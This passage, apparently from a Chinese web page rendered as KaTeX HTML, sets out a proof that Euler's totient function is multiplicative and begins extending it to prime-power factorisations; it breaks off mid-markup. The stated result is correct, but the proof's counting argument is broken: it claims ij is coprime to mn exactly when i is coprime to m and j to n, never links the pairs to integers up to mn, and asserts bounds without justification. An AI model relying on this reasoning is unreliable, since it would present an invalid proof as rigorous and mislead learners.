xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 形成的整数对格点，并分析这些点中有多少是与 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">mn</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">mn</span></span></span></span> 互质的。具体步骤如下：</p><ol><li><strong>整数对的构造</strong>：<br>考虑由 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 形成的 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">mn</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">mn</span></span></span></span> 个整数对 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(i, j)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">)</span></span></span></span>，其中 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>i</mi><mo>≤</mo><mi>m</mi></mrow><annotation encoding="application/x-tex">1 \leq i \leq m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7955em;vertical-align:-0.136em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>j</mi><mo>≤</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">1 \leq j \leq n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>。如果<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mi>j</mi></mrow><annotation encoding="application/x-tex">ij</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">ij</span></span></span></span> 与<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">mn</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">mn</span></span></span></span>互质，称作<strong>互质点</strong>，这些整数对可以视为一个 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mo>×</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">m \times n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 的矩形格点图。</li><li><strong>互质点的计数</strong>：<br>对于每个整数对 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(i, j)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">)</span></span></span></span>，我们需要判断 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">mn</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">mn</span></span></span></span> 是否与 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mi>j</mi></mrow><annotation encoding="application/x-tex">ij</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">ij</span></span></span></span> 互质。因为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 互质，显然 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> 必须与<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span>互质，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span>与 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>互质，才会有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mi>j</mi></mrow><annotation encoding="application/x-tex">ij</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">ij</span></span></span></span>与<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">mn</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">mn</span></span></span></span>互质，否则就存在公因数了。所以互质点最多<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>m</mi><mo stretchy="false">)</mo><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi(m)\varphi(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mclose">)</span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>个。</li><li><strong>独立互质点的乘积</strong>：<br>在 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> 中与 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> 互质的整数数量为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>m</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi(m)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mclose">)</span></span></span></span>，在 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 中与 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 互质的整数数量为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>。这些互质的整数可以独立地在 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 的范围内选择，而且不会影响对方的选择，所以互质点最少有<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>m</mi><mo stretchy="false">)</mo><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi(m)\varphi(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mclose">)</span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>个。</li></ol><p>因此，与 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">mn</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">mn</span></span></span></span> 互质的整数对 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(i, j)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">)</span></span></span></span> 的总数就是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>m</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi(m)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mclose">)</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span> 的乘积，即 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>m</mi><mo stretchy="false">)</mo><mo>×</mo><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi(m) \times \varphi(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>。综上所述，我们得出 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>m</mi><mi>n</mi><mo stretchy="false">)</mo><mo>=</mo><mi>φ</mi><mo stretchy="false">(</mo><mi>m</mi><mo stretchy="false">)</mo><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi(mn) = \varphi(m)\varphi(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal">mn</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mclose">)</span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>。</p><h3 id="一般情况">一般情况</h3><p>对于任意整数 n，存在唯一质数分解 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>=</mo><msubsup><mi>p</mi><mn>1</mn><msub><mi>k</mi><mn>1</mn></msub></msubsup><msubsup><mi>p</mi><mn>2</mn><msub><mi>k</mi><mn>2</mn></msub></msubsup><mo>⋯</mo><msubsup><mi>p</mi><mi>r</mi><msub><mi>k</mi><mi>r</mi></msub></msubsup></mrow><annotation encoding="application/x-tex">n = p_1^{k_1} p_2^{k_2} \cdots p_r^{k_r}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.1973em;vertical-align:-0.2663em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.931em;"><span style="top:-2.4337em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.1449em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:-0.0315em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2663em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.931em;"><span style="top:-2.4337em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.1449em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:-0.0315em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2663em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-2.453em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1645em;"><span style="top:-2.357em;margin-left:-0.0315em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span></span></span></span>。由于这些素数幂相互之间是互质的，根据第 2 步，我们可以写出</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>=</mo><mi>φ</mi><mo stretchy="false">(</mo><msubsup><mi>p</mi><mn>1</mn><msub><mi>k</mi><mn>1</mn></msub></msubsup><mo stretchy="false">)</mo><mi>φ</mi><mo stretchy="false">(</mo><msubsup><mi>p</mi><mn>2</mn><msub><mi>k</mi><mn>2</mn></msub></msubsup><mo stretchy="false">)</mo><mo>⋯</mo><mi>φ</mi><mo stretchy="false">(</mo><msubsup><mi>p</mi><mi>r</mi><msub><mi>k</mi><mi>r</mi></msub></msubsup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi(n) = \varphi(p_1^{k_1})\varphi(p_2^{k_2}) \cdots \varphi(p_r^{k_r})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.1973em;vertical-align:-0.2663em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.931em;"><span style="top:-2.4337em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.1449em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:-0.0315em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2663em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.931em;"><span style="top:-2.4337em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.1449em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:-0.0315em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2663em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8991em;"><span style="top:-2.453em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1645em;"><span style="top:-2.357em;margin-left:-0.0315em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></p><p>根据第 1 步，我们知道每个 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><msubsup><mi>p</mi><mi>i</mi><msub><mi>k</mi><mi>i</mi></msub></msubsup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi(p_i^{k_i})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2079em;vertical-align:-0.2769em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.931em;"><span style="top:-2.4231em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.1449em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3281em;"><span style="top:-2.357em;margin-left:-0.0315em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" 